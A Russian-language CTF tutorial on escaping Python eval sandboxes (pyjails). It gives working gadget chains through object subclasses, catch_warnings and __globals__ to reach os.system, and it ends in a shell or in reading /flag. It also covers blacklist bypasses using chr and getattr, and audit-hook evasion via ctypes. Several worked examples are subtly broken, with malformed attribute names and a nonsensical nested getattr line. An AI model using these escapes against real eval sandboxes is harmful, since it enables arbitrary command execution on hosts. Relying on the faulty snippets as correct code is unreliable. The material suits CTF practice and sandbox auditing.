Python-jail (pyjail) — это песочница, где вам дают ограниченный `eval`/`exec` и просят прочитать флаг. Фильтры могут запрещать слова (`open`, `import`, `os`), символы (`_`, `.`, кавычки) или опасные функции. Задача — найти путь к `os.system`/`builtins` в обход фильтров. Это чистая головоломка, но навык пригодится при аудите любых «безопасных» eval-песочниц.

## Что такое pyjail

Типичный pyjail:

```python
blacklist = ['import', 'os', 'system', 'open', '__', 'eval', 'exec']
src = input(">>> ")
if any(b in src for b in blacklist):
    print("no"); exit()
eval(src)
```

Фильтры бывают на **слова**, **символы**, **длину**, **AST**. Обход зависит от того, что именно запрещено. Первое правило — составить карту ограничений: что разрешено, что нет.

## Поиск builtins и окружения

Если `__builtins__` доступен:

```python
>>> __builtins__
<module 'builtins' (built-in)>
>>> __builtins__.open('/flag').read()
```

Но часто `__` запрещено. Обходы:

- `getattr(obj, '__class__')` — если `getattr` доступен;
- `obj.__class__` через строку: `getattr(o, chr(95)*2 + 'class' + chr(95)*2)`;
- юникод-эквиваленты и `\x5f` в строках.

## Gadget-цепочки через классы

Классический путь: от любого объекта к `object.__subclasses__()` и далее к нужному классу (`subprocess.Popen`, `os._wrap_close`, `warnings.catch_warnings`).

```python
().__class__.__bases__[0].__subclasses__()
```

Это даёт список всех загруженных классов. Ищем, например, `Popen`:

```python
[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__=='Popen'][0](
    ['/bin/sh','-c','cat /flag'])
```

С `__` запрещённым:

```python
getattr(getattr(().__class__, chr(95)*2+'bases'+chr(95)*2)[0], chr(95)*2+'subclasses'+chr(95)*2)()
```

Дальше ищем `catch_warnings` (его `__init__.__globals__` содержит `__builtins__`):

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').system('sh')
```

## Доступ к globals

Многие функции держат ссылку на глобальное пространство:

```python
(func.__globals__)      # словарь глобальных имён
(func.__init__.__globals__)
(func.__getattribute__('__globals__'))
```

Через `__globals__['__builtins__']` возвращаемся к полному набору встроенных функций, даже если `__builtins__` вычищен из контекста.

## Обход чёрных списков

Приёмы против фильтров:

| Фильтр запрещает | Обход |
|------------------|-------|
| `import` | `__import__('os')` или `__builtins__.__import__` |
| `os` | `chr(111)+chr(115)`, `'\x6f\x73'`, конкатенация |
| `_` | `chr(95)`, `\x5f`, `getattr` со строкой |
| `.` | `getattr(o, 'attr')`, `o[0]` для словарей |
| кавычки | `chr()`, bytes, `[].__doc__`-трюки |
| `open` | `io.open`, `os.popen`, `subprocess` |
| `system` | `os.popen`, `os.execv`, `subprocess.run` |
| пробелы | табы, скобки, `\x20` |
| длина | сжать в одну строку, использовать `eval` |

Пример с запретом `_`, `.` и кавычек: строим строки через `chr` и вызываем через `getattr`.

## Аудит-хуки (PEP 578)

`sys.addaudithook` регистрирует хук, который видит события (`open`, `exec`, `os.system`). Обходы:

- если хук добавлен **после** импорта `os`, старые ссылки могут ещё работать;
- через `ctypes` можно вызвать libc напрямую, минуя Python-события;
- через `os.posix_spawn`/`fork`+`exec` иногда событие называется иначе;
- используя `__reduce__`/pickle для исполнения в другом контексте.

Но если хук правильно блокирует `open`/`exec`/`ctypes`, побег сильно усложняется — часто нужна уязвимость в самом движке.

## Ограничение через AST

Современный «правильный» pyjail парсит AST и запрещает узлы `Import`, `Attribute`, `Call` на опасные имена. Обходы тогда ищут дыры в самом фильтре: не проверенные узлы (`Subscript`, `BinOp`), неявные вызовы, декораторы. Но это уже ближе к pwn.

## Полный разобранный пример

Фильтр: запрещены `import`, `os`, `open`, `_`, `.`, `'`, `"`, пробелы.

```python
# строим строки через chr и вызовы через getattr
g = getattr
B = g(g(g,chr(95)*2+'cl'+'ass'+chr(95)*2))   # __class__ недоступно напрямую
```

Проще: если `getattr` и `chr` не запрещены, а только `_` и кавычки:

```python
C = chr(95)
sub = getattr(getattr((), C*2+'class'+C*2), C*2+'base'+C*2+C*2)
```

Дальше находим `warnings` и через `__globals__` тянем `builtins`:

```python
cls = [c for c in sub()[0].__subclasses__() if c.__name__ == 'catch_warnings'][0]
os = cls()._module.__builtins__[chr(111)+chr(115)]
os.system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103))
```

Флаг прочитан.

## Частые ошибки и подводные камни

- Пытаться импортировать то, что не загружено (`__subclasses__` содержит только уже импортированные классы).
- Забывать, что `__builtins__` может быть `dict` или `module` — зависит от контекста.
- Использовать запрещённые символы в обходе, где фильтр проверяет **исходник**, а не AST.
- Не проверять, есть ли `getattr`/`chr`/`bytes` в области видимости.
- Считать, что если `os` запрещён словом, то `os.popen` нельзя — можно, если построить имя.
- Игнорировать ограничение по длине: длинные цепочки могут не пройти.

## Дополнительная теория: MRO, дескрипторы и frames

Гаджет-цепочки опираются на внутреннее устройство Python. У любого объекта есть `__class__`, у класса — `__mro__` (порядок разрешения методов) и `__bases__`. Через `__subclasses__()` класса `object` видно все загруженные классы. Но есть и другие пути: **frames** — объекты кадра стека содержат `f_builtins` (встроенные функции) и `f_globals`. Достать кадр можно через `sys._getframe()`, через `traceback`, через генератор (`gi_frame`), через исключение (`e.__traceback__.tb_frame`). Если `__builtins__` вычищен, `frame.f_builtins['__import__']` часто возвращает его обратно.

**Дескрипторы** и `__getattribute__` тоже дают доступ: `object.__getattribute__(obj, name)`. Метод `__reduce__`/`__reduce_ex__` используется в pickle-гаджетах. Понимание MRO помогает найти класс с нужным методом в цепочке наследования. Все эти пути — материал для обхода фильтров, запрещающих конкретные имена.

## Изоляция на уровне процесса

Настоящая защита от pyjail — не фильтры в Python, а изоляция процесса: запуск интерпретатора с `seccomp` (запрет `execve`/`open`), в отдельном namespace, под непривилегированным пользователем, с rlimits и без сети. Тогда даже побег из Python-логики не даёт доступа к системе. В CTF, если задача «сбегите из pyjail», фильтры обычно слабые; но если фильтр — это `seccomp`, смотрите `misc-seccomp-escape`. Полезно уметь различать: «логический» джейл (фильтр слов/AST) vs «системный» (seccomp/namespaces) — техники разные.

## Разбор ошибок и отладка

Если payload падает с `NameError` — вероятно, функция недоступна в текущем пространстве имён; проверьте `dir()`, `globals()`, `locals()`. Если `AttributeError` на `__class__` — значит `__` запрещено; стройте имя через `chr(95)`. Если фильтр ругается на слово — разбейте его конкатенацией или используйте альтернативу. Если `__subclasses__()` пуст или нужного класса нет — импортируйте модуль, который его загружает (но `import` может быть запрещён; тогда ищите уже загруженный модуль). Тестируйте локально: скопируйте фильтр и подбирайте payload, пока не сработает. Помните, что AST-фильтры проверяют структуру, а не строку, — обходы там другие.

## Частые вопросы

**Почему `__builtins__` иногда модуль, а иногда dict?** В `__main__` это обычно модуль `builtins`, а в импортированных модулях — dict. Это зависит от контекста исполнения, поэтому код обхода должен обрабатывать оба случая. Через `func.__globals__['__builtins__']` вы получите то, что есть в конкретном модуле.

**Что делать, если `__subclasses__()` не содержит нужного класса?** Класс загружается только при импорте модуля, который его использует. Если `subprocess` не импортирован, `Popen` в списке нет. Ищите уже загруженные классы, дающие доступ к `builtins` (например, `warnings.catch_warnings`), а не конкретно `Popen`. От `builtins` уже можно импортировать что угодно.

**Как обойти фильтр, который запрещает все буквы?** Стройте строки из `chr`, `bytes`, `hex`, `bin`. Например, `chr(111)+chr(115)` = `os`. Имена атрибутов тоже можно строить так и получать через `getattr`. Если запрещены и цифры — используйте `True`/`False` и арифметику (`True+True` = 2).

**Чем AST-фильтр отличается от строкового?** Строковый ищет подстроки в исходнике; AST-фильтр разбирает код и запрещает узлы/имена. Против строкового помогают кодирование и конкатенация; против AST — поиск неучтённых узлов (`Subscript`, `Lambda`, декораторы) или обход через вложенные структуры. Всегда проверяйте, что именно фильтруется.

## Практический разбор: побег без подчёркиваний и кавычек

Дано: фильтр запрещает `_`, `.`, кавычки, пробелы, `import`, `os`, `open`. Побег:

```python
# getattr и chr доступны
g = getattr
C = chr(95)                      # '_'
# __class__ без подчёркиваний
cls = g((), C*2+'class'+C*2)     # <class 'tuple'>
# __bases__ -> object
base = g(cls, C*2+'bases'+C*2)[0]
# __subclasses__ -> ищем catch_warnings
subs = g(base, C*2+'subclasses'+C*2)()
warn = [c for c in subs if c.__name__=='catch_warnings'][0]
# через _module.__builtins__ получаем builtins
bi = g(g(warn(), C*2+'module'+C*2), C*2+'builtins'+C*2)
# импортируем os и запускаем cat
os_mod = bi[chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)](chr(111)+chr(115))
g(os_mod, 'system')(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103))
```

Все строки собраны из `chr`, атрибуты — через `getattr`, поэтому запрещённые символы не встречаются в исходнике. Это типичный обход строковых фильтров. Если запрещены и цифры — используйте `True`/`False` (`True+True`=2). Если запрещён `getattr` — ищите `object.__getattribute__` через уже доступные объекты. Тестируйте локально, копируя фильтр.
